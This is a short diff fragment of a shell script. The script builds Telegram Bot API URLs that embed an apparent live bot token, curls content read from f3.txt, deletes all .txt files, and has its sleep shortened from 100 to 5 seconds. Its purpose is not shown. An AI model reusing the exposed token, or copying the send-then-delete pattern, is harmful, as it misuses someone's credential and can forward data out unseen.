@@ -5,4 +5,4 @@ sed "s|^|https://api.telegram.org/bot1669913040:AAHZ6Wl5SiWiUuyA8QvlJ55oadXZeYmR
 sleep 5
 curl … $(cat f3.txt)
 rm *.txt
-sleep 100
+sleep 5
